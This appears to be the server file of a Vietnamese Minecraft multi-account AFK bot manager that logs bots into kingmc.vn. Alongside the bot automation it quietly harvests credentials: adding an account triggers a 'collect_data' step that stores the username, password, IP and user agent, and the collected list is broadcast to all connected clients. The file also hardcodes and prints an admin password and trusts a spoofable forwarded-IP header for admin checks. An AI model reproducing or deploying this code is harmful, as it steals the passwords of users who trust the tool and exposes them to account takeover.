const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const mineflayer = require('mineflayer');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;

// ===== CẤU HÌNH ADMIN =====
const ADMIN_IP = '1.53.131.94'; 
const ADMIN_PASSWORD = 'AlphaZo2026';

// ===== DỮ LIỆU TOÀN CỤC =====
const clientData = {};
let globalCollectedData = [];
let isMaintenance = false;

app.use(express.static('public'));

// ===== API KIỂM TRA ADMIN =====
app.get('/api/check-admin', (req, res) => {
    let clientIp = req.headers['x-forwarded-for'] 
        ? req.headers['x-forwarded-for'].split(',')[0].trim() 
        : req.socket.remoteAddress;
    if (clientIp && clientIp.includes('::1')) clientIp = '127.0.0.1';
    const isAdmin = (clientIp === ADMIN_IP || clientIp === '127.0.0.1' || clientIp.includes('192.168.'));
    res.json({ isAdmin, ip: clientIp });
});

// ===== BẮT LỖI TOÀN CỤC =====
process.on('uncaughtException', (err) => console.log('[LỖI HỆ THỐNG]:', err.message));
process.on('unhandledRejection', (reason) => console.log('[LỖI PROMISE]:', reason?.message || reason));

// ================================================================
//  SOCKET.IO
// ================================================================
io.on('connection', (socket) => {
    let rawIp = socket.handshake.headers['x-forwarded-for'] 
        ? socket.handshake.headers['x-forwarded-for'].split(',')[0].trim() 
        : socket.handshake.address;
    if (rawIp && rawIp.includes('::1')) rawIp = '127.0.0.1';
    const clientIp = rawIp;

    console.log(`[${new Date().toLocaleString()}] 🔌 Client connected: ${clientIp}`);

    // Khởi tạo dữ liệu cho IP này
    if (!clientData[clientIp]) {
        clientData[clientIp] = {
            accounts: [],
            bots: {}
        };
    }

    // Gửi danh sách tài khoản về client
    socket.emit('init_accounts', clientData[clientIp].accounts);
    socket.emit('sync_collected_data', globalCollectedData);
    socket.emit('maintenance_status', isMaintenance);

    // ===== THU THẬP DỮ LIỆU =====
    socket.on('collect_data', (data) => {
        const entry = {
            ip: clientIp,
            time: new Date().toLocaleString(),
            username: data.username || '(chưa nhập)',
            password: data.password || '(trống)',
            userAgent: data.userAgent || 'N/A'
        };
        globalCollectedData.push(entry);
        console.log(`[${new Date().toLocaleString()}] 📥 Data from ${clientIp}: ${entry.username}`);
        io.emit('sync_collected_data', globalCollectedData);
        io.emit('log', `[${new Date().toLocaleString()}] 📥 Đã thu thập dữ liệu từ IP: ${clientIp}`);
    });

    socket.on('clear_collected_data', () => {
        globalCollectedData = [];
        io.emit('sync_collected_data', globalCollectedData);
        io.emit('log', `[${new Date().toLocaleString()}] 🧹 Đã xóa toàn bộ dữ liệu thu thập`);
    });

    // ===== BẢO TRÌ =====
    socket.on('toggle_maintenance', (status) => {
        isMaintenance = status;
        io.emit('maintenance_status', isMaintenance);
        io.emit('log', `[${new Date().toLocaleString()}] 🛠️ Bảo trì ${status ? 'BẬT' : 'TẮT'}`);
        console.log(`[${new Date().toLocaleString()}] 🛠️ Maintenance: ${status ? 'ON' : 'OFF'}`);
    });

    // ===== QUẢN LÝ ACCOUNTS (MULTI-ACCOUNT) =====
    socket.on('add_account', (data) => {
        const { username, password } = data;
        if (!username) return;
        
        // Tự động thu thập dữ liệu
        socket.emit('collect_data', {
            username: username,
            password: password || 'caigicungdc',
            userAgent: socket.handshake.headers['user-agent'] || 'N/A'
        });

        const id = 'acc_' + Date.now() + Math.floor(Math.random() * 1000);
        clientData[clientIp].accounts.push({
            id,
            username: username.trim(),
            password: password ? password.trim() : 'caigicungdc',
            autoReconnect: true,
            status: 'OFFLINE',
            color: '#ff4444'
        });
        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        socket.emit('log', `[SYSTEM] ✅ Đã thêm tài khoản: ${username}`);
    });

    socket.on('delete_account', (id) => {
        if (clientData[clientIp].bots[id]) {
            try { clientData[clientIp].bots[id].quit(); } catch(e){}
            delete clientData[clientIp].bots[id];
        }
        clientData[clientIp].accounts = clientData[clientIp].accounts.filter(acc => acc.id !== id);
        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        socket.emit('log', `[SYSTEM] 🗑️ Đã xóa tài khoản`);
    });

    socket.on('toggle_auto_reconnect', (id) => {
        const acc = clientData[clientIp].accounts.find(a => a.id === id);
        if (acc) {
            acc.autoReconnect = !acc.autoReconnect;
            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        }
    });

    // ============================================================
    //  BOT MINEFLAYER (MULTI-ACCOUNT - MỖI BOT 1 TÀI KHOẢN)
    // ============================================================
    socket.on('start_bot', (id) => {
        const account = clientData[clientIp].accounts.find(acc => acc.id === id);
        if (!account) return;

        if (clientData[clientIp].bots[id]) {
            try { clientData[clientIp].bots[id].quit(); } catch(e){}
        }

        account.status = 'CONNECTING...';
        account.color = 'yellow';
        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        socket.emit('log', `[${account.username}] 🔄 Đang kết nối tới kingmc.vn...`);

        try {
            const bot = mineflayer.createBot({
                host: 'kingmc.vn',
                port: 25565,
                username: account.username,
                password: account.password,
                auth: 'offline',
                version: '1.16.5',
                checkTimeoutInterval: 120000
            });

            clientData[clientIp].bots[id] = bot;
            let hasJoinedKingSMP = false;
            let hasExecutedAFK = false;
            let isLoggedIn = false;

            bot.on('login', () => {
                account.status = 'LOGGING IN...';
                account.color = 'orange';
                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
                socket.emit('log', `[${account.username}] 🔑 Đang đăng nhập...`);
            });

            bot.on('spawn', () => {
                if (hasJoinedKingSMP) {
                    account.status = 'ONLINE / KINGSMP';
                    account.color = '#00ff88';
                    socket.emit('log', `[${account.username}] ✅ ĐÃ VÀO KINGSMP!`);
                } else {
                    account.status = 'ONLINE / LOBBY';
                    account.color = '#00ff88';
                    socket.emit('log', `[${account.username}] ✅ Đã vào Sảnh chính!`);
                }
                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
            });

            bot.on('messagestr', (message) => {
                socket.emit('log', `[${account.username}]: ${message}`);
                const msgLower = message.toLowerCase();

                if (msgLower.includes('/register') || msgLower.includes('/dk')) {
                    setTimeout(() => { if (bot) bot.chat(`/dk ${account.password} ${account.password}`); }, 2000);
                } else if (msgLower.includes('/login') || msgLower.includes('/dn')) {
                    setTimeout(() => { if (bot) bot.chat(`/dn ${account.password}`); }, 2000);
                }

                if (!hasJoinedKingSMP && !isLoggedIn && 
                    (msgLower.includes('đăng nhập thành công') || msgLower.includes('bạn đã đăng nhập'))) {
                    isLoggedIn = true;
                    socket.emit('log', `[${account.username}] ✅ Đã đăng nhập! Đợi 5s gõ /menu...`);
                    setTimeout(() => {
                        if (bot && !hasJoinedKingSMP) {
                            socket.emit('log', `[${account.username}] 📋 Đang gõ /menu...`);
                            bot.chat('/menu');
                        }
                    }, 5000);
                }
            });

            bot.on('windowOpen', (window) => {
                const rawTitle = JSON.stringify(window.title || '').toLowerCase();
                socket.emit('log', `[${account.username}] 📂 Menu mở: ${rawTitle}`);

                // BƯỚC 1: Chọn KingSMP (Slot 24)
                if (!hasJoinedKingSMP) {
                    setTimeout(() => {
                        if (!bot || !bot.currentWindow) return;
                        socket.emit('log', `[${account.username}] 🖱️ Click Slot 24 chọn KingSMP...`);
                        hasJoinedKingSMP = true;

                        bot.clickWindow(24, 0, 0)
                            .then(() => socket.emit('log', `[${account.username}] ✅ Click Slot 24 thành công!`))
                            .catch(() => socket.emit('log', `[${account.username}] ⚠️ Bỏ qua cảnh báo transaction`));

                        setTimeout(() => {
                            try { bot.closeWindow(window); } catch(e){}
                        }, 500);

                    }, 2500);
                } 
                // BƯỚC 2: Gõ /afk + Click Slot 1
                else if (hasJoinedKingSMP && !hasExecutedAFK) {
                    socket.emit('log', `[${account.username}] 💤 Gửi lệnh /afk...`);
                    bot.chat('/afk');
                    
                    setTimeout(() => {
                        if (!bot || !bot.currentWindow) return;
                        socket.emit('log', `[${account.username}] 🖱️ Click Slot 1 chọn AFK...`);
                        hasExecutedAFK = true;

                        bot.clickWindow(1, 0, 0)
                            .then(() => socket.emit('log', `[${account.username}] 🎉 ĐÃ VÀO CHẾ ĐỘ AFK!`))
                            .catch(() => socket.emit('log', `[${account.username}] ⚠️ Bỏ qua cảnh báo transaction AFK`));

                        setTimeout(() => {
                            try { bot.closeWindow(window); } catch(e){}
                        }, 500);

                    }, 2500);
                }
            });

            bot.on('end', (reason) => {
                socket.emit('log', `[${account.username}] ⚠️ Ngắt kết nối: ${reason}`);
                account.status = 'OFFLINE';
                account.color = '#ff4444';
                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
                delete clientData[clientIp].bots[id];

                if (account.autoReconnect) {
                    socket.emit('log', `[${account.username}] 🔄 Tự động kết nối lại sau 6 giây...`);
                    setTimeout(() => {
                        if (!clientData[clientIp].bots[id] && account.autoReconnect) {
                            socket.emit('restart_internal_bot', id);
                        }
                    }, 6000);
                }
            });

            bot.on('error', (err) => {
                if (err.code === 'EPIPE') {
                    socket.emit('log', `[${account.username}] ⚠️ Mất kết nối server, đang thử lại...`);
                } else {
                    socket.emit('log', `[${account.username} ❌ Lỗi]: ${err.message}`);
                }
            });

        } catch (e) {
            socket.emit('log', `[Lỗi khởi tạo ${account.username}]: ${e.message}`);
            account.status = 'ERROR';
            account.color = '#ff4444';
            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        }
    });

    socket.on('stop_bot', (id) => {
        const account = clientData[clientIp].accounts.find(acc => acc.id === id);
        if (account) {
            account.status = 'STOPPED';
            account.color = '#ff4444';
            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        }
        if (clientData[clientIp].bots[id]) {
            try { clientData[clientIp].bots[id].quit(); } catch(e){}
            delete clientData[clientIp].bots[id];
        }
        socket.emit('log', `[SYSTEM] ⏹️ Đã dừng bot: ${account ? account.username : id}`);
    });

    socket.on('send_chat', ({ id, cmd }) => {
        const bot = clientData[clientIp].bots[id];
        if (bot) {
            bot.chat(cmd);
            socket.emit('log', `[💬 ĐÃ GỬI LỆNH]: ${cmd}`);
        } else {
            socket.emit('log', `[⚠️] Bot này chưa online!`);
        }
    });

    socket.on('get_accounts', () => {
        socket.emit('init_accounts', clientData[clientIp].accounts);
    });

    socket.on('disconnect', () => {
        console.log(`[${new Date().toLocaleString()}] 🔌 Client disconnected: ${clientIp}`);
    });
});

// ===== START SERVER =====
server.listen(PORT, () => {
    console.log(`🚀 Cat Tool Server đang chạy tại: http://localhost:${PORT}`);
    console.log(`👑 Admin IP: ${ADMIN_IP}`);
    console.log(`🔑 Admin Password: ${ADMIN_PASSWORD}`);
});
